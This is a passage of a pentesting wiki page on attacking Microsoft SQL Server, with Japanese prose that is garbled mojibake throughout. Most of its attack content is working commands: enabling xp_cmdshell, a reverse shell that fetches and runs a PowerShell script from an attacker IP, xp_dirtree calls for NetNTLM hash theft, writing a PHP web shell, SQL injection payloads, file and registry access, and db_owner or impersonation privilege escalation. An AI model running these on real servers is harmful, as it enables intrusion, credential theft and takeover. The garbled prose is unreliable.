3. **ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ï¼ˆPrincipalï¼‰:** ã‚»ã‚­ãƒ¥ã‚¢ãƒ–ãƒ«ã«å¯¾ã—ã¦æ¨©é™ã‚’å—ã‘å–ã‚‹ã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã®ã“ã¨ã‚’ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¨å‘¼ã³ã¾ã™ã€‚æœ€ã‚‚ä¸€èˆ¬çš„ãªãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ãƒ­ã‚°ã‚¤ãƒ³ã¨ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã™ã€‚ã‚»ã‚­ãƒ¥ã‚¢ãƒ–ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯ã€æ¨©é™ã®ä»˜ä¸ã‚„æ‹’å¦ã€ã¾ãŸã¯ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã¤ãƒ­ãƒ¼ãƒ«ã«ãƒ­ã‚°ã‚¤ãƒ³ã‚„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦åˆ¶å¾¡ã•ã‚Œã¾ã™ã€‚
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯

### OSã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œ

{% hint style="danger" %}
ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯ã€**`xp_cmdshell`**ãŒ**æœ‰åŠ¹åŒ–**ã•ã‚Œã¦ã„ã‚‹ã ã‘ã§ãªãã€**`xp_cmdshell`ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã®EXECUTEæ¨©é™**ã‚‚å¿…è¦ã§ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€**`xp_cmdshell`**ã‚’ä½¿ç”¨ã§ãã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼ˆsysadminsä»¥å¤–ï¼‰ã‚’ç¢ºèªã§ãã¾ã™ã€‚
```sql
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
{% endhint %}
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' â€”
```
### NetNTLMãƒãƒƒã‚·ãƒ¥ã®ç›—ã¿å‡ºã— / ãƒªãƒ¬ãƒ¼ã‚¢ã‚¿ãƒƒã‚¯

èªè¨¼ã§ä½¿ç”¨ã•ã‚Œã‚‹ãƒãƒƒã‚·ãƒ¥ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹ãŸã‚ã«ã€**SMBã‚µãƒ¼ãƒãƒ¼**ã‚’èµ·å‹•ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆä¾‹ï¼š`impacket-smbserver`ã¾ãŸã¯`responder`ï¼‰ã€‚
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
{% hint style="warning" %}
æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€sysadminsä»¥å¤–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒMSSQLé–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã§ãã¾ã™ã€‚
```sql
Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```
{% endhint %}

ãƒ„ãƒ¼ãƒ«ã§ã‚ã‚‹**responder**ã‚„**Inveigh**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€**NetNTLMãƒãƒƒã‚·ãƒ¥ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã‚Œã‚‰ã®ãƒ„ãƒ¼ãƒ«ã®ä½¿ç”¨æ–¹æ³•ã¯ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### MSSQLã®ä¿¡é ¼ãƒªãƒ³ã‚¯ã®æ‚ªç”¨

ã“ã®æ©Ÿèƒ½ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€[**ã“ã®è¨˜äº‹**](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md) **ã‚’èª­ã‚“ã§è©³ç´°ã‚’ç¢ºèªã—ã¦ãã ã•ã„:**

{% content-ref url="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md" %}
[abusing-ad-mssql.md](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md)
{% endcontent-ref %}

### **ãƒ•ã‚¡ã‚¤ãƒ«ã®æ›¸ãè¾¼ã¿**

`MSSQL`ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãè¾¼ã‚€ã«ã¯ã€ç®¡ç†è€…ç‰¹æ¨©ãŒå¿…è¦ãªãŸã‚ã€[**Ole Automation Procedures**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)ã‚’æœ‰åŠ¹ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®å¾Œã€ã„ãã¤ã‹ã®ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã‚’å®Ÿè¡Œã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã¾ã™ã€‚
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **OPENROWSETã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹**

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€`MSSQL`ã¯ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒèª­ã¿å–ã‚Šã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã¤ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ å†…ã®ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®SQLã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
ãŸã ã—ã€**`BULK`** ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯ã€**`ADMINISTER BULK OPERATIONS`** ã¾ãŸã¯ **`ADMINISTER DATABASE BULK OPERATIONS`** ã®æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®SQLiæ”»æ’ƒæ‰‹æ³•:

This technique involves exploiting SQL injection vulnerabilities by manipulating input data in a way that triggers an error response from the Microsoft SQL Server. By carefully crafting malicious input, an attacker can cause the server to reveal sensitive information or execute unintended SQL queries.

ã“ã®æ‰‹æ³•ã§ã¯ã€Microsoft SQL Serverã‹ã‚‰ã‚¨ãƒ©ãƒ¼ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’å¼•ãèµ·ã“ã™ã‚ˆã†ã«å…¥åŠ›ãƒ‡ãƒ¼ã‚¿ã‚’æ“ä½œã™ã‚‹ã“ã¨ã§ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¾ã™ã€‚æ‚ªæ„ã®ã‚ã‚‹å…¥åŠ›ã‚’æ³¨æ„æ·±ãä½œæˆã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ã‚µãƒ¼ãƒãƒ¼ãŒæ©Ÿå¯†æƒ…å ±ã‚’æ˜ã‚‰ã‹ã«ã—ãŸã‚Šã€æ„å›³ã—ãªã„SQLã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Šã¨ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œï¼ˆPythonã¨Rï¼‰**

MSSQLã§ã¯ã€**Pythonã¨/ã¾ãŸã¯Rã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚³ãƒ¼ãƒ‰ã¯ã€ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«**xp\_cmdshell**ã‚’ä½¿ç”¨ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã¯**ç•°ãªã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

ä¾‹ï¼š**'R'**ã® _"Hellow World!"_ **ãŒå‹•ä½œã—ãªã„**å ´åˆã®ä¾‹ï¼š

![](<../../.gitbook/assets/image (185) (1).png>)

è¤‡æ•°ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«è¨­å®šã•ã‚ŒãŸPythonã‚’ä½¿ç”¨ã—ãŸä¾‹ï¼š
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã®èª­ã¿å–ã‚Š

Microsoft SQL Serverã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã ã‘ã§ãªãã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚„[**Windows Registry**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)ã¨ã®ã‚„ã‚Šå–ã‚Šã‚‚å¯èƒ½ã«ã™ã‚‹**è¤‡æ•°ã®æ‹¡å¼µã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£**ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚

| **é€šå¸¸ã®**                  | **ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹å¯¾å¿œ**                     |
| ---------------------------- | -------------------------------------- |
| sys.xp\_regread              | sys.xp\_instance\_regread              |
| sys.xp\_regenumvalues        | sys.xp\_instance\_regenumvalues        |
| sys.xp\_regenumkeys          | sys.xp\_instance\_regenumkeys          |
| sys.xp\_regwrite             | sys.xp\_instance\_regwrite             |
| sys.xp\_regdeletevalue       | sys.xp\_instance\_regdeletevalue       |
| sys.xp\_regdeletekey         | sys.xp\_instance\_regdeletekey         |
| sys.xp\_regaddmultistring    | sys.xp\_instance\_regaddmultistring    |
| sys.xp\_regremovemultistring | sys.xp\_instance\_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
**ãã®ä»–ã®ä¾‹**ã«ã¤ã„ã¦ã¯ã€[**å…ƒã®ã‚½ãƒ¼ã‚¹**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### MSSQLãƒ¦ãƒ¼ã‚¶ãƒ¼å®šç¾©é–¢æ•°ã§ã®RCE - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

ã‚«ã‚¹ã‚¿ãƒ é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã€MSSQLå†…ã§.NET dllã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ãŸã ã—ã€ã“ã‚Œã«ã¯`dbo`ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã§ã™ã®ã§ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¸ã®æ¥ç¶šã¯`sa`ã¾ãŸã¯ç®¡ç†è€…ã®å½¹å‰²ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

[**ã“ã®ãƒªãƒ³ã‚¯**](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp)ã‚’å‚ç…§ã—ã¦ã€ä¾‹ã‚’ã”è¦§ãã ã•ã„ã€‚

### RCEã®ä»–ã®æ–¹æ³•

ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œã‚’å–å¾—ã™ã‚‹ãŸã‚ã®ä»–ã®æ–¹æ³•ã‚‚ã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€[æ‹¡å¼µã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server)ã®è¿½åŠ ã€[CLRã‚¢ã‚»ãƒ³ãƒ–ãƒª](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration)ã€[SQL Serverã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã‚¸ãƒ§ãƒ–](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15)ã€ãŠã‚ˆã³[å¤–éƒ¨ã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql)ã®è¿½åŠ ãŒã‚ã‚Šã¾ã™ã€‚

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofã¯ã™ã¹ã¦ã®æš—å·ãƒã‚°å ±å¥¨é‡‘ã®å ´æ‰€ã§ã™ã€‚**

**é…å»¶ãªã—ã§å ±é…¬ã‚’å—ã‘å–ã‚‹**\
HackenProofã®å ±å¥¨é‡‘ã¯ã€é¡§å®¢ãŒå ±å¥¨é‡‘äºˆç®—ã‚’å…¥é‡‘ã—ãŸå¾Œã«é–‹å§‹ã•ã‚Œã¾ã™ã€‚ãƒã‚°ãŒæ¤œè¨¼ã•ã‚ŒãŸå¾Œã«å ±é…¬ã‚’å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**Web3ãƒšãƒ³ãƒˆestingã®çµŒé¨“ã‚’ç©ã‚€**\
ãƒ–ãƒ­ãƒƒã‚¯ãƒã‚§ãƒ¼ãƒ³ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¨ã‚¹ãƒãƒ¼ãƒˆã‚³ãƒ³ãƒˆãƒ©ã‚¯ãƒˆã¯æ–°ã—ã„ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§ã™ï¼æˆé•·ã™ã‚‹Web3ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ãƒã‚¹ã‚¿ãƒ¼ã—ã¾ã—ã‚‡ã†ã€‚

**Web3ãƒãƒƒã‚«ãƒ¼ãƒ¬ã‚¸ã‚§ãƒ³ãƒ‰ã«ãªã‚‹**\
å„æ¤œè¨¼æ¸ˆã¿ã®ãƒã‚°ã§è©•åˆ¤ãƒã‚¤ãƒ³ãƒˆã‚’ç²å¾—ã—ã€é€±é–“ãƒªãƒ¼ãƒ€ãƒ¼ãƒœãƒ¼ãƒ‰ã®ãƒˆãƒƒãƒ—ã‚’åˆ¶è¦‡ã—ã¾ã—ã‚‡ã†ã€‚

[**HackenProofã§ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**](https://hackenproof.com/register)ã—ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã‹ã‚‰å ±é…¬ã‚’å¾—ã¾ã—ã‚‡ã†ï¼

{% embed url="https://hackenproof.com/register" %}

## MSSQLç‰¹æ¨©æ˜‡æ ¼

### db\_ownerã‹ã‚‰sysadminã¸

**é€šå¸¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼**ãŒã€**ç®¡ç†è€…**ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼ˆä¾‹ï¼š**sa**ï¼‰ãŒæ‰€æœ‰ã™ã‚‹ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å¯¾ã—ã¦**`db_owner`**ã®å½¹å‰²ã‚’ä¸ãˆã‚‰ã‚Œã€ãã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒ**`trustworthy`**ã¨ã—ã¦æ§‹æˆã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã“ã‚Œã‚‰ã®ç‰¹æ¨©ã‚’æ‚ªç”¨ã—ã¦**ç‰¹æ¨©æ˜‡æ ¼**ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚ãªãœãªã‚‰ã€ãã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ä½œæˆã•ã‚ŒãŸ**ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£**ãŒæ‰€æœ‰è€…ï¼ˆ**ç®¡ç†è€…**ï¼‰ã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã‚‹ã‹ã‚‰ã§ã™ã€‚
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
**metasploit**ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
ã¾ãŸã¯ã€**PS** ã‚¹ã‚¯ãƒªãƒ—ãƒˆ:
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãªã‚Šã™ã¾ã—

SQL Serverã«ã¯ã€**`IMPERSONATE`**ã¨ã„ã†ç‰¹åˆ¥ãªæ¨©é™ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€å®Ÿè¡Œãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ãƒ­ã‚°ã‚¤ãƒ³ã®æ¨©é™ã‚’å¼•ãç¶™ãã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã ã—ã€ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆãŒãƒªã‚»ãƒƒãƒˆã•ã‚Œã‚‹ã‹ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒçµ‚äº†ã™ã‚‹ã¾ã§æœ‰åŠ¹ã§ã™ã€‚
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```
{% hint style="info" %}
ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã‚‹å ´åˆã€ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä»–ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚„ãƒªãƒ³ã‚¯ã•ã‚ŒãŸã‚µãƒ¼ãƒãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

ãªãŠã€sysadminã«ãªã‚‹ã¨ä»–ã®ã©ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã‚‚ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
ã“ã®æ”»æ’ƒã¯**metasploit**ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
ã¾ãŸã¯ã€**PS** ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚‚åŒæ§˜ã®çµæœã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## MSSQLã‚’ä½¿ç”¨ã—ãŸæ°¸ç¶šåŒ–

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

## ãƒ­ãƒ¼ã‚«ãƒ«ç‰¹æ¨©æ˜‡æ ¼

MSSQLã‚µãƒ¼ãƒãƒ¼ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ç‰¹æ¨©ãƒˆãƒ¼ã‚¯ãƒ³**SeImpersonatePrivilege**ã‚’æœ‰åŠ¹ã«ã—ã¦ã„ã¾ã™ã€‚\
ãŠãã‚‰ãã€æ¬¡ã®ã„ãšã‚Œã‹ã®ãƒšãƒ¼ã‚¸ã‚’å‚è€ƒã«ã—ã¦ã€**ç®¡ç†è€…ã«æ˜‡æ ¼**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã§ã—ã‚‡ã†ï¼š

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/juicypotato.md" %}
[juicypotato.md](../../windows-hardening/windows-local-privilege-escalation/juicypotato.md)
{% endcontent-ref %}

## Shodan

* `port:1433 !HTTP`

## å‚è€ƒæ–‡çŒ®

* [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
* [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
